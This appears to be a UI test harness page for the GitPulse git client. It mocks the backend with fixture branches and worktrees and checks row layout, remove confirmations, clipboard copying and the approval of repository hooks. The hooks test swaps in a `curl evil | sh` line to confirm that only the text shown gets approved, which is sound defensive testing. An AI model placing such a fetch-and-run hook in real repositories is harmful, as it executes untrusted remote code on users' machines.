<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>GitPulse · Branch merge preview</title>
<style>html,body{margin:0;height:100%}body{background:var(--color-background);color:var(--color-textPrimary);font:13px system-ui}main{display:flex;height:100%;gap:36px}#sidebar{width:320px;flex-shrink:0;padding:18px 8px;box-sizing:border-box;background:var(--color-surface)}article{padding:40px 20px;max-width:440px}article h1{font-size:26px}article p{line-height:1.7;color:var(--color-textMuted)}#verdict{position:fixed;bottom:4px;right:6px;z-index:100;font:11px system-ui;background:#132b25;color:#a7f3d0;padding:4px 8px;border-radius:6px}#verdict:empty{display:none}</style></head>
<body><main><div id="sidebar"></div><article><h1>Branch merging</h1><p>Copy a full branch name from the sidebar, or choose Merge to review a local or remote source and its destination. Branch actions also open the review with a source selected.</p><p>This preview uses fixture repositories. Merge actions here do not change a real repository.</p></article></main><div id="toasts"></div><output id="verdict"></output>
<script type="module">
import "../src/app.css";
import { mount, unmount, tick } from "svelte";
import { get } from "svelte/store";
import { themeStore } from "../src/lib/stores/themeStore";
import { repoStore } from "../src/lib/stores/repoStore";
import { filterStore } from "../src/lib/stores/filterStore";
import { toastStore } from "../src/lib/stores/toastStore";
import BranchList from "../src/lib/components/BranchList.svelte";
import WorktreesPanel from "../src/lib/components/WorktreesPanel.svelte";
import { sidebarRowHeight } from "../src/lib/sidebar/metrics";
import ToastContainer from "../src/lib/components/ToastContainer.svelte";
import { promptState, completePrompt } from "../src/lib/stores/modalStore";
const params = new URLSearchParams(location.search);
themeStore.setTheme(params.get("theme") === "light" ? "light" : "dark");
const results = [], crashes = [], merges = [], copies = [], unexpected = [], transfers = [];
const branchDeletes = [], tagDeletes = [], branchCreates = [], wtRemovals = [], wtCreates = [], hookApprovals = [];
// The repository's hooks file as the host would read it; `approved` follows the last approval.
let hooksFile = {file:".gitpulse/hooks",content:"post_create: make setup",approved:false};
// The long worktree's change count; null is "not scanned", which is not clean.
let wtDirty = 12;
let tags = [], tagsTruncated = false, failTags = false, deleteRefusal = "", failCreate = false;
let current = "main", failMerge = false, pendingMerge = null, operation = null, probeFailed = false, copyFailed = false;
// Churn and divergence are derived from the name so they are stable across
// runs but non-zero: every branch used to arrive as all-zeros, so the row's
// entire measured-number path — churn bar, upstream arrows, files, ahead of
// base — was never rendered by any harness check. That chrome is what used
// to squeeze the branch name down to a few characters, so a fixture without
// it cannot show the layout it broke. `main` stays clean: it is the
// checked-out default, and some checks read it as the quiet baseline.
const churn = name => {
  let h = 0;
  for (const ch of name) h = (h * 31 + ch.codePointAt(0)) % 9973;
  return {ahead_count: h % 23, behind_count: h % 4, commits_ahead_of_base: h % 7,
    commits_behind_base: h % 11, additions: 40 + (h % 3277), deletions: h % 149,
    files_changed: 1 + (h % 17)};
};
const branch = (name, remote = false) => ({name, is_current: name === current && !remote, is_remote: remote, remote_name: remote ? name.split("/")[0] : null, tip_commit_id: "abc123456789", is_default: name === "main", is_gone: false, last_commit_timestamp: Date.now()/1000 - (name.startsWith("release/") ? STALE_AGE : 0), last_author: "Alex", last_summary: "Refine branch interactions",
  ...(name === "main" && !remote
    ? {ahead_count: 0, behind_count: 0, commits_ahead_of_base: 0, commits_behind_base: 0, additions: 0, deletions: 0, files_changed: 0}
    : churn(name))});
// release/0.0.9 is deliberately old. The two-line row drops the separate
// "stale" chip and tints the commit age instead — one token carrying the
// exact figure and the verdict computed from it — so a fixture where every
// branch is seconds old cannot show that path at all.
const STALE_AGE = 120 * 86400;
/** The repository every fixture below speaks for. */
const REPO = "/fixture/branches";
/** A real Claude session directory name, at its real length. */
const LONG_WORKTREE = "gitpulse-prompting-extraction-c8e628";
const names = ["main", "feature/branch-selection", "feature/keyboard-navigation", "release/0.0.9"];
let branches = [...names.map(n => branch(n)), branch("origin/feature/branch-selection", true), branch("upstream/main", true), branch("origin/HEAD", true)];
const fixture = {
  cmd_resolve_repo: a => ({path:a.path,name:"GitPulse",is_bare:false}),
  cmd_list_branches: () => branches.map(b => ({...b,is_current:!b.is_remote&&b.name===current})),
  cmd_get_status: () => operation ? [{path:"conflict.txt",status_code:"UU",is_staged:false,is_conflicted:true,additions:0,deletions:0}] : [],
  cmd_last_fetch_at: () => null, cmd_note_tab_activated: () => null, cmd_list_tags: () => {if(failTags)throw Error("Fixture tag read failed");return {tags,truncated:tagsTruncated};},
  // A non-forced delete of an unmerged branch is refused with git's own words.
  cmd_delete_branch: a => {branchDeletes.push({branch:a.branchName,force:a.force});if(!a.force&&deleteRefusal)throw Error(deleteRefusal);return "";},
  cmd_delete_tag: a => {tagDeletes.push(a.tagName);return "";},
  cmd_create_branch: a => {branchCreates.push(a.branchName);if(failCreate)throw Error("Fixture branch create failed");return "";}, cmd_stash_list: () => ({ entries: [], truncated: false }),
  cmd_watch_repo: () => null, cmd_unwatch_repo: () => null, cmd_list_repo_files: () => [],
  cmd_get_commit_graph: () => ({nodes:[],edges:[],total_commits:0,truncated:false}),
  cmd_set_recent_menu: () => null, cmd_workspace_sync: () => ({repos:[]}),
  cmd_devcouncil_init: () => ({repo:REPO,state_dir:`${REPO}/.devmap`,exclude:{status:"already_ignored",source:"harness"},workspace_registry:null,workspace_reason:null,skipped_untrusted:[],skipped_unavailable:[],devmap_available:false}),
  cmd_devmap_maybe_refresh: () => ({decision:"skip_unavailable",facts:{available:false,is_fresh:false,schema_ok:false,already_building:false},reason:null}),
  cmd_provenance_freshness_batch: a => a.revisions.map(commit_sha=>({commit_sha,distance:null,confidence:null,is_fresh:false,unmeasured_reason:"Fixture",notes_readable:true,verification:null,session:null})),
  cmd_branch_stats: () => ({updates:[],capped:false,compute_failures:0,compared_to:"main"}),
  cmd_repo_operation: () => {if(probeFailed)throw Error("Fixture probe failed");return operation;},
  // A real agent session name and a real agent branch, both long: a fixture
  // of short names cannot show the layout the worktree row broke.
  cmd_list_worktrees: () => [
    {path:REPO,name:"GitPulse",branch:"main",head:"f".repeat(40),is_main:true,is_bare:false,is_detached:false,is_locked:false,is_prunable:false,dirty_files:1},
    {path:`${REPO}/.claude/worktrees/${LONG_WORKTREE}`,name:LONG_WORKTREE,branch:`claude/${LONG_WORKTREE}`,head:"b".repeat(40),is_main:false,is_bare:false,is_detached:false,is_locked:false,is_prunable:false,dirty_files:wtDirty}],
  cmd_add_worktree: a => {wtCreates.push(a);return {output:{path:a.targetPath,cache_error:null,hook_error:null,hook_notice:null}};},
  cmd_preview_worktree_hooks: () => ({...hooksFile}),
  cmd_approve_worktree_hooks: a => {hookApprovals.push(a.content);if(a.content===hooksFile.content)hooksFile={...hooksFile,approved:true};return null;},
  cmd_remove_worktree: a => {wtRemovals.push({targetPath:a.targetPath,force:a.force});return null;},
  cmd_repository_trust: () => ({path:REPO,git_dir:`${REPO}/.git`,common_dir:`${REPO}/.git`,identity:"fixture",scope:"repository",worktrees:2}),
  cmd_task_view: () => ({available:false,store_path:"",leases:[],error:""}),
  cmd_worktree_task: () => null,
  cmd_push: a => {transfers.push({kind:"push",branch:a.branch});return "";},
  cmd_pull: a => {transfers.push({kind:"pull",branch:a.branch});return "";},
  cmd_merge_branch: async a => {merges.push(a);if(pendingMerge)await new Promise(resolve => {pendingMerge(resolve);});if(failMerge)throw Error("Fixture merge failed");return "Merged";},
};
window.__TAURI_INTERNALS__ = {invoke:async(cmd,args) => {if(fixture[cmd])return fixture[cmd](args);if(cmd.startsWith("plugin:event|"))return 1;unexpected.push(cmd);throw Error(`Unconfigured command: ${cmd}`);},transformCallback:cb=>cb};
if(params.has("check")) {
  Object.defineProperty(navigator,"clipboard",{configurable:true,value:{writeText:async text=>{if(copyFailed)throw Error("Fixture clipboard denied");copies.push(text);}}});
  document.execCommand = () => false;
}
window.addEventListener("error",event=>crashes.push(event.message));
window.addEventListener("unhandledrejection",event=>crashes.push(String(event.reason)));
const settle = async () => {await tick();await new Promise(resolve=>{const channel=new MessageChannel();channel.port1.onmessage=()=>{channel.port1.close();channel.port2.close();resolve();};channel.port2.postMessage(null);});await tick();};
const waitFor = async test => {for(let i=0;i<100;i++){await settle();if(test())return;}throw Error("Timed out waiting for UI");};
const button = name => [...document.querySelectorAll("button")].find(b=>b.textContent.trim()===name||b.getAttribute("aria-label")===name);
const click = async name => {const b=button(name);if(!b)throw Error(`Missing button: ${name}`);if(b.disabled)throw Error(`Disabled button: ${name}`);b.focus();b.click();await settle();};
const search = async text => {const input=document.querySelector("#merge-branch-search");input.value=text;input.dispatchEvent(new Event("input",{bubbles:true}));await settle();};
const check = (name,pass) => results.push({name,pass:Boolean(pass)});
const dialog = () => document.querySelector('[role="dialog"]');
await repoStore.openRepo("/fixture/branches");
mount(BranchList,{target:document.getElementById("sidebar")});
mount(ToastContainer,{target:document.getElementById("toasts")});
await settle();
if(params.has("check")) {
  try {
    // --- two-line branch rows -------------------------------------------
    // Geometry, so it can only be checked where real layout exists. The
    // sidebar here is 320px: narrow enough that line two overflows on a
    // branch with churn AND divergence, which is the case that used to
    // paint numbers straight through the row's edge.
    const branchRows = () => [...document.querySelectorAll(".gp-cv-row")]
      .filter(r => r.querySelector('[aria-label^="Copy branch name"]'));
    const lines = row => [...row.querySelector(".flex-col").children];
    // Rightmost pixel either line actually PAINTS: a child clipped by its
    // line cannot paint past that line's own edge.
    const paintRight = row => Math.max(...lines(row).flatMap(line => {
      const edge = line.getBoundingClientRect().right;
      return [...line.children].map(c => Math.min(c.getBoundingClientRect().right, edge));
    }));
    check("two-line rows exist to measure",branchRows().length===4);
    // The window math derives every scroll position from these heights. A
    // row whose markup outgrows its declared height desynchronises the
    // virtual window into blank bands, and nothing else here would notice.
    const declaredHeight = sidebarRowHeight("branch","spacious","two-line");
    check("each branch row is exactly as tall as the window math believes",
      branchRows().every(r => Math.round(r.getBoundingClientRect().height)===declaredHeight));
    check("headers stay one line while branch rows grow",
      [...document.querySelectorAll(".gp-cv-row")]
        .filter(r => !r.querySelector('[aria-label^="Copy branch name"]'))
        .every(r => Math.round(r.getBoundingClientRect().height)===sidebarRowHeight("section-header","spacious","two-line")));
    check("neither line paints under the hover actions",branchRows().every(row =>
      paintRight(row) <= row.querySelector('[aria-label^="Copy branch name"]').parentElement.getBoundingClientRect().left + 0.5));
    check("no row paints past its own edge",branchRows().every(row =>
      paintRight(row) <= row.getBoundingClientRect().right));
    // The name gets line one to itself. Measured against the widest thing
    // the old single line left it on this fixture, which was ~52px.
    const navRow = branchRows().find(r => r.textContent.includes("keyboard-navigation"));
    const nameEl = lines(navRow)[0].querySelector(".truncate");
    const roomForName = line => line.getBoundingClientRect().width
      - [...line.children].filter(c => c !== nameEl)
          .reduce((n,c) => n + c.getBoundingClientRect().width, 0)
      - 6 * (line.children.length - 1);
    check("the branch name is shown in full, not ellipsised",nameEl.scrollWidth <= nameEl.clientWidth + 1);
    check("the branch name owns line one",roomForName(lines(navRow)[0]) > 150);
    check("line one carries no counters to compete with the name",
      !/[+↑↓]\d/.test(lines(navRow)[0].textContent));
    check("line two carries the measured numbers",
      /\+2768/.test(lines(navRow)[1].textContent) && /↑14/.test(lines(navRow)[1].textContent));
    // Clipping is the last resort and it must cost the attribution first,
    // never a count — a half-drawn "+27" reads as a smaller number.
    const busy = lines(navRow)[1];
    check("line two clips rather than overflowing",busy.scrollWidth > busy.clientWidth);
    const paintedWidth = (el,line) => {
      const b = el.getBoundingClientRect(), edge = line.getBoundingClientRect().right;
      return Math.max(0, Math.min(b.right, edge) - b.left);
    };
    const authorEl = [...busy.querySelectorAll("span")].find(el => el.title.startsWith("Last commit by"));
    check("clipping takes the author first — it paints nothing",paintedWidth(authorEl,busy)===0);
    check("clipping never touches a count",
      busy.querySelector('[aria-label*="additions"]').getBoundingClientRect().right
        <= busy.getBoundingClientRect().right + 0.5);
    // Stale is the age's own tint now, not a second chip beside it.
    const staleRow = branchRows().find(r => r.textContent.includes("0.0.9"));
    const staleAge = [...lines(staleRow)[1].querySelectorAll("span")]
      .find(el => el.title.startsWith("Last commit"));
    check("a stale branch shows its real age, not a chip",
      /mo|y/.test(staleAge.textContent) && !staleRow.textContent.includes("stale"));
    check("the stale age is tinted, and says so where it is read out",
      staleAge.className.includes("amber") && staleAge.title.endsWith("stale"));
    const freshAge = [...lines(navRow)[1].querySelectorAll("span")]
      .find(el => el.title.startsWith("Last commit"));
    check("a fresh branch's age is not tinted",!freshAge.className.includes("amber"));

    // --- two-line worktree rows -----------------------------------------
    // Same defect, same sidebar, same fix — so the same harness. The
    // worktree row kept its single line long after branch rows gave theirs
    // up, and it failed harder: its name competed with a session chip, a
    // branch capped at 90px, a change count AND a permanently reserved
    // action rail, so `gitpulse-prompting-extraction-c8e628` rendered in
    // 79px of the 210px it needs at the 360px default width, and in 0px at
    // the 264px minimum. Mounted and unmounted here so the merge checks
    // below keep the exact document they were written against.
    const wtHost = document.createElement("div");
    wtHost.style.cssText = "width:304px";
    document.getElementById("sidebar").appendChild(wtHost);
    const wtPanel = mount(WorktreesPanel,{target:wtHost});
    await waitFor(() => wtHost.textContent.includes(LONG_WORKTREE));
    const wtRows = [...wtHost.querySelectorAll("div.rounded-2xl")]
      // The open control is named by what it will do: "Open X", or "Show the
      // open tab for X" when a tab is already on that worktree.
      .filter(r => r.querySelector('button[aria-label^="Open "], button[aria-label^="Show the open tab for "]'));
    const wtLines = row => [...(row?.children ?? [])].filter(c => c.getBoundingClientRect().height > 0);
    const longRow = wtRows.find(r => r.textContent.includes(LONG_WORKTREE));
    const wtName = longRow?.querySelector(".truncate");
    // Read through optionals throughout. Collapsing the row back to one line
    // is the regression these checks exist to catch, and it is exactly what
    // makes `wtLines(longRow)[1]` undefined — so a bare `.textContent` would
    // throw, and a check that throws writes no row at all. Absent reads like
    // never written; see harness/README.md.
    const wtLine = i => wtLines(longRow)[i]?.textContent ?? "";
    check("worktree rows exist to measure",wtRows.length===2);
    check("every worktree row has two lines",wtRows.every(r => wtLines(r).length===2));
    check("the worktree name is shown in full, not ellipsised",
      !!wtName && wtName.scrollWidth <= wtName.clientWidth + 1);
    check("the worktree name owns line one",
      !!wtName && !!wtLines(longRow)[0]?.contains(wtName)
      && !/\d+ changed/.test(wtLine(0)) && !wtLine(0).includes("claude/"));
    check("line two carries the branch, the session chip and the count",
      wtLine(1).includes("claude/" + LONG_WORKTREE)
      && /CLAUDE/i.test(wtLine(1)) && /12 changed/.test(wtLine(1)));
    // Same rule line two of a branch row lives by: clip, never overflow.
    check("no worktree row paints past its own edge",wtRows.every(row => {
      const edge = row.getBoundingClientRect().right + 0.5;
      return [...row.querySelectorAll("span,button")]
        .every(el => el.getBoundingClientRect().right <= edge);
    }));
    // The confirm asks for a second click on the button that armed it, so
    // that button must not move. It does not today and did not before —
    // the action cluster is right-anchored and the trash button is its last
    // child — and this pins it, because moving the confirm to line two is
    // exactly the kind of change that could have cost it.
    // Looked up BEFORE the click, so it is the un-armed label; arming swaps
    // it for the cost sentence that `removeArmTitle` builds.
    const trash = [...(longRow?.querySelectorAll("button") ?? [])]
      .find(b => b.getAttribute("aria-label")==="Remove this worktree");
    const armedFrom = trash?.getBoundingClientRect().left;
    trash?.click();await settle();
    check("arming the remove confirm does not move the button it asks to click again",
      !!trash && Math.abs(trash.getBoundingClientRect().left - armedFrom) < 0.5);
    check("the armed confirm names the cost, inside the row",
      !!longRow && longRow.textContent.includes("Discard 12 changed files?")
      && longRow.scrollWidth <= Math.ceil(longRow.getBoundingClientRect().width) + 1);
    // Arming wrote nothing; the second click on the same button removes, and
    // force is passed only for a scanned dirty tree whose cost was named.
    check("arming the remove confirm removes nothing",wtRemovals.length===0);
    const armed=()=>[...wtHost.querySelectorAll("button")].find(b=>(b.getAttribute("aria-label")??"").startsWith("Discard 12 changed files?")||(b.getAttribute("aria-label")??"").startsWith("Not scanned for changes"));
    wtDirty=null;
    armed()?.click();await waitFor(()=>wtRemovals.length===1);
    check("the second click force-removes a scanned dirty worktree after naming its cost",
      wtRemovals[0].force===true&&wtRemovals[0].targetPath===`${REPO}/.claude/worktrees/${LONG_WORKTREE}`);
    // The removal reloads the list, now unscanned (null): never forced.
    await waitFor(()=>[...wtHost.querySelectorAll("button")].some(b=>b.getAttribute("aria-label")==="Remove this worktree"));
    [...wtHost.querySelectorAll("button")].find(b=>b.getAttribute("aria-label")==="Remove this worktree").click();await settle();
    check("an unscanned worktree's armed confirm says it was not scanned",armed()?.getAttribute("aria-label")==="Not scanned for changes — click again to try a clean remove");
    armed()?.click();await waitFor(()=>wtRemovals.length===2);
    check("an unscanned worktree is never force-removed",wtRemovals[1].force===false);
    wtDirty=12;
    // Repository hooks run shell commands from a file the working tree
    // controls: off by default (build-cache sharing on), and approved only as
    // the exact text that was shown.
    const wtButton=label=>[...wtHost.querySelectorAll("button")].find(b=>b.getAttribute("aria-label")===label||b.textContent.trim()===label);
    const formBox=label=>[...wtHost.querySelectorAll("form label")].find(l=>l.textContent.includes(label))?.querySelector('input[type="checkbox"]');
    const consent=()=>wtHost.querySelector('[data-testid="worktree-hooks-consent"]');
    const submitWorktree=async path=>{const field=wtHost.querySelector('form input[placeholder="/absolute/path for the worktree"]');field.value=path;field.dispatchEvent(new Event("input",{bubbles:true}));await settle();field.form.requestSubmit();await waitFor(()=>wtCreates.length&&wtCreates.at(-1).targetPath===path);};
    wtButton("Create worktree").click();await settle();
    check("a new worktree starts with hooks off and build-cache sharing on, and no consent box",
      formBox("Run repository hooks")?.checked===false&&formBox("Share build caches")?.checked===true&&!consent());
    await submitWorktree("/fixture/wt-plain");
    check("creating with the defaults sends hooks off and caches on",wtCreates.at(-1).runHooks===false&&wtCreates.at(-1).cowCaches===true);
    await waitFor(()=>wtButton("Create worktree"));wtButton("Create worktree").click();await settle();
    formBox("Run repository hooks").click();await waitFor(()=>consent()?.textContent.includes("post_create: make setup"));
    check("asking for hooks shows the file's exact text and says nothing runs until it is approved",
      consent().textContent.includes(".gitpulse/hooks runs these as shell commands")
      &&consent().textContent.includes("Not approved: nothing runs until you approve exactly this text."));
    // The file changes on disk after it was shown: the approval must carry
    // the text the person read, never the newer one.
    const shownText=hooksFile.content;
    hooksFile={...hooksFile,content:"post_create: curl evil | sh"};
    [...consent().querySelectorAll("button")].find(b=>b.textContent.trim()==="Approve these hooks").click();
    await waitFor(()=>hookApprovals.length===1);await settle();await settle();
    check("approving sends exactly the text that was shown, not the file as it is now",
      hookApprovals[0]===shownText&&hooksFile.approved===false
      &&consent()?.textContent.includes("post_create: curl evil | sh")&&consent()?.textContent.includes("Not approved"));
    [...consent().querySelectorAll("button")].find(b=>b.textContent.trim()==="Approve these hooks").click();
    await waitFor(()=>consent()?.textContent.includes("Approved. Editing the file asks again."));
    check("approving the text on screen marks it approved",hookApprovals.at(-1)==="post_create: curl evil | sh");
    await submitWorktree("/fixture/wt-hooks");
    check("creating with hooks asked for sends that choice",wtCreates.at(-1).runHooks===true);
    hooksFile={file:".gitpulse/hooks",content:"post_create: make setup",approved:false};
    await unmount(wtPanel);wtHost.remove();

    check("visible merge entry point",button("Merge branches"));
    await click("Copy branch name feature/branch-selection");
    check("copy preserves full branch path",copies.at(-1)==="feature/branch-selection");
    check("copy success is announced",get(toastStore).some(t=>t.message==="Copied feature/branch-selection"));
    check("copy leaves history filter unchanged",get(filterStore).selectedBranch===null);
    document.querySelector('[role="tree"]').dispatchEvent(new KeyboardEvent("keydown",{key:"ArrowDown",bubbles:true}));
    const copyKey=new KeyboardEvent("keydown",{key:"Enter",bubbles:true,cancelable:true});

    check("row navigation does not consume copy button activation",!copyKey.defaultPrevented);
    copyFailed=true;await click("Copy branch name main");
    check("copy denial is reported",get(repoStore).error==="Could not copy to clipboard");
    copyFailed=false;repoStore.setError(null);
    const sourceRow=[...document.querySelectorAll("button")].find(b=>b.title.startsWith("feature/branch-selection\n"));
    sourceRow.dispatchEvent(new MouseEvent("contextmenu",{bubbles:true,cancelable:true,clientX:150,clientY:260}));await settle();

    check("context menu preserves source and merge mode",button("Select local branch feature/branch-selection").getAttribute("aria-checked")==="true"&&dialog().querySelector('input[name="merge-mode"]:checked')?.value==="ff-only");
    await click("Cancel");

    // from a null menu and throws inside the click: nothing is pushed, and
    // the error escapes as an uncaught exception.
    const crashesBeforeTransfer=crashes.length;
    for(const kind of ["Push","Pull"]){
      sourceRow.dispatchEvent(new MouseEvent("contextmenu",{bubbles:true,cancelable:true,clientX:150,clientY:260}));await settle();
      await click(kind);await settle();
    }
    check(`menu Push and Pull act on the branch the menu was opened for (${crashes.slice(crashesBeforeTransfer).join(" | ")})`,
      crashes.length===crashesBeforeTransfer&&transfers.length===2
